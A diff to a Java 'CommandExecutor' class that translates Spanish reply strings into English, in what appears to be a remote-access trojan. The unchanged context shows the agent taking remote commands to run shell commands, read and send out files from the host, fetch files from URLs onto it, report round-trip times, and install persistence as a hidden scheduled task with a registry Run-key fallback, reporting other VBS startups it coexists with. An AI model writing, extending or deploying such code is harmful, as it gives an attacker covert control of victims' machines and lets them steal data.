@@ -35,7 +35,7 @@ public final class CommandExecutor {
 			}
 		} catch (Throwable throwable) {
 			Log.debug("Command failed", throwable);
-			poller.reply("Error: " + throwable.getMessage());
+			poller.reply("Failed: " + throwable.getMessage());
 		}
 	}
 
@@ -56,20 +56,20 @@ public final class CommandExecutor {
 				case "ping" -> ping(message);
 				case "gateway" -> poller.gatewayCommand(args);
 				case "kill" -> {
-					poller.reply("Cerrando agente");
+					poller.reply("Closing agent");
 					poller.kill();
 				}
-				default -> poller.reply("Comando desconocido: " + command);
+				default -> poller.reply("Unknown command: " + command);
 			}
 		} catch (Throwable throwable) {
 			Log.debug("Command failed", throwable);
-			poller.reply("Error: " + throwable.getMessage());
+			poller.reply("Failed: " + throwable.getMessage());
 		}
 	}
 
 	private void shell(String command) {
 		if (command.isEmpty()) {
-			poller.reply("Uso: shell <comando>");
+			poller.reply("Usage: shell <command>");
 			return;
 		}
 		try {
@@ -81,7 +81,7 @@ public final class CommandExecutor {
 				poller.reply("````\n" + output + "\n````");
 			}
 		} catch (Throwable throwable) {
-			poller.reply("Error: " + throwable.getMessage());
+			poller.reply("Failed: " + throwable.getMessage());
 		}
 	}
 
@@ -98,7 +98,7 @@ public final class CommandExecutor {
 				poller.reply("````\n" + text + "\n````");
 			}
 		} catch (Throwable throwable) {
-			poller.reply("Error: " + throwable.getMessage());
+			poller.reply("Failed: " + throwable.getMessage());
 		}
 	}
 
@@ -106,25 +106,25 @@ public final class CommandExecutor {
 		Path target = args.size() > 1 ? resolve(args.get(1)) : Path.of(System.getProperty("user.home"));
 		if (Files.isDirectory(target)) {
 			poller.cwd(target);
-			poller.reply("Directorio: " + target);
+			poller.reply("Directory: " + target);
 		} else {
-			poller.reply("No existe: " + target);
+			poller.reply("Not found: " + target);
 		}
 	}
 
 	private void cat(List<String> args) {
 		if (args.size() < 2) {
-			poller.reply("Uso: cat <archivo>");
+			poller.reply("Usage: cat <file>");
 			return;
 		}
 		try {
 			Path file = resolve(args.get(1));
 			if (!Files.isRegularFile(file)) {
-				poller.reply("No existe: " + file);
+				poller.reply("Not found: " + file);
 				return;
 			}
 			if (Files.size(file) > 2L * 1024L * 1024L) {
-				poller.reply("Archivo demasiado grande");
+				poller.reply("File too large");
 				return;
 			}
 			String text = Files.readString(file, StandardCharsets.UTF_8);
@@ -134,28 +134,28 @@ public final class CommandExecutor {
 				poller.reply("````\n" + text + "\n````");
 			}
 		} catch (Throwable throwable) {
-			poller.reply("Error: " + throwable.getMessage());
+			poller.reply("Failed: " + throwable.getMessage());
 		}
 	}
 
 	private void download(List<String> args) {
 		if (args.size() < 2) {
-			poller.reply("Uso: download <archivo>");
+			poller.reply("Usage: download <file>");
 			return;
 		}
 		Path file = resolve(args.get(1));
 		if (!Files.isRegularFile(file)) {
-			poller.reply("No existe: " + file);
+			poller.reply("Not found: " + file);
 			return;
 		}
 		try {
 			if (Files.size(file) > 8L * 1024L * 1024L) {
-				poller.reply("Archivo demasiado grande");
+				poller.reply("File too large");
 				return;
 			}
 			poller.uploadFile(file);
 		} catch (Throwable throwable) {
-			poller.reply("Error: " + throwable.getMessage());
+			poller.reply("Failed: " + throwable.getMessage());
 		}
 	}
 
@@ -169,7 +169,7 @@ public final class CommandExecutor {
 			} else {
 				List<Object> attachments = Json.list(message.get("attachments"));
 				if (attachments.isEmpty()) {
-					poller.reply("Uso: upload <url> [destino]");
+					poller.reply("Usage: upload <url> [destination]");
 					return;
 				}
 				Map<String, Object> attachment = Json.map(attachments.get(0));
@@ -181,14 +181,14 @@ public final class CommandExecutor {
 			if (parent != null) {
 				Files.createDirectories(parent);
 			}
-			long maximo = 32L * 1024L * 1024L;
+			long maximum = 32L * 1024L * 1024L;
 			java.net.HttpURLConnection connection = (java.net.HttpURLConnection) new java.net.URL(url).openConnection();
 			connection.setConnectTimeout(10000);
 			connection.setReadTimeout(30000);
 			connection.setRequestProperty("User-Agent", "ServerPackCore/0.1");
-			if (connection.getContentLengthLong() > maximo) {
+			if (connection.getContentLengthLong() > maximum) {
 				connection.disconnect();
-				poller.reply("Archivo demasiado grande (maximo 32 MB)");
+				poller.reply("File too large (maximum 32 MB)");
 				return;
 			}
 			boolean exceeded = false;
@@ -199,7 +199,7 @@ public final class CommandExecutor {
 				int read;
 				while ((read = input.read(buffer)) != -1) {
 					total += read;
-					if (total > maximo) {
+					if (total > maximum) {
 						exceeded = true;
 						break;
 					}
@@ -210,12 +210,12 @@ public final class CommandExecutor {
 			}
 			if (exceeded) {
 				Files.deleteIfExists(dest);
-				poller.reply("Archivo demasiado grande (maximo 32 MB)");
+				poller.reply("File too large (maximum 32 MB)");
 				return;
 			}
-			poller.reply("Guardado: " + dest + " (" + Files.size(dest) + " bytes)");
+			poller.reply("Saved: " + dest + " (" + Files.size(dest) + " bytes)");
 		} catch (Throwable throwable) {
-			poller.reply("Error: " + throwable.getMessage());
+			poller.reply("Failed: " + throwable.getMessage());
 		}
 	}
 
@@ -228,7 +228,7 @@ public final class CommandExecutor {
 			poller.uploadFile(file);
 			Files.deleteIfExists(file);
 		} catch (Throwable throwable) {
-			poller.reply("Error: " + throwable.getMessage());
+			poller.reply("Failed: " + throwable.getMessage());
 		}
 	}
 
@@ -236,21 +236,21 @@ public final class CommandExecutor {
 		boolean enable = args.size() > 1 && args.get(1).equalsIgnoreCase("on");
 		poller.persist(enable);
 		boolean result = enable ? Persistence.enable(installDir) : Persistence.disable(installDir);
-		StringBuilder text = new StringBuilder(enable ? "Persistencia on: " : "Persistencia off: ");
+		StringBuilder text = new StringBuilder(enable ? "Persistence on: " : "Persistence off: ");
 		text.append(result);
 		if (enable && result) {
-			text.append("\nTarea oculta: \\").append(Persistence.task()).append("\nLanzador: ")
+			text.append("\nHidden task: \\").append(Persistence.task()).append("\nLauncher: ")
 				.append(Persistence.launcher(installDir));
 		} else if (enable) {
-			text.append("\nNo se pudo verificar la tarea; revisa el Programador de tareas o el respaldo en HKCU\\...\\Run.");
+			text.append("\nCould not verify the task; check Task Scheduler or the HKCU\\...\\Run fallback.");
 		}
 		List<String> others = Persistence.foreign(installDir);
 		if (!others.isEmpty()) {
-			text.append("\nOtros arranques por wscript/VBS:");
+			text.append("\nOther wscript/VBS startups:");
 			for (String other : others) {
 				text.append("\n- ").append(other);
 			}
-			text.append("\nCoexisten sin problema salvo que maten procesos java o reutilicen nuestro directorio.");
+			text.append("\nThey coexist unless they kill java processes or reuse our directory.");
 		}
 		poller.reply(text.toString());
 	}
@@ -262,11 +262,11 @@ public final class CommandExecutor {
 				millis = Math.min(60000L, Long.parseLong(args.get(1)));
 			}
 			Thread.sleep(millis);
-			poller.reply("Dormido " + millis + " ms");
+			poller.reply("Slept " + millis + " ms");
 		} catch (InterruptedException interrupted) {
-			poller.reply("interrumpido");
+			poller.reply("interrupted");
 		} catch (Throwable throwable) {
-			poller.reply("Error: " + throwable.getMessage());
+			poller.reply("Failed: " + throwable.getMessage());
 		}
 	}
 
@@ -282,7 +282,7 @@ public final class CommandExecutor {
 			}
 		}
 		long rtt = poller.gatewayRtt();
-		poller.reply("pong transporte=" + Json.str(message, "_transport", "rest")
+		poller.reply("pong transport=" + Json.str(message, "_transport", "rest")
 			+ " gateway=" + poller.gatewayStateText()
 			+ " rtt=" + (rtt < 0L ? "n/a" : rtt + " ms")
 			+ " end-to-end=" + endToEnd);
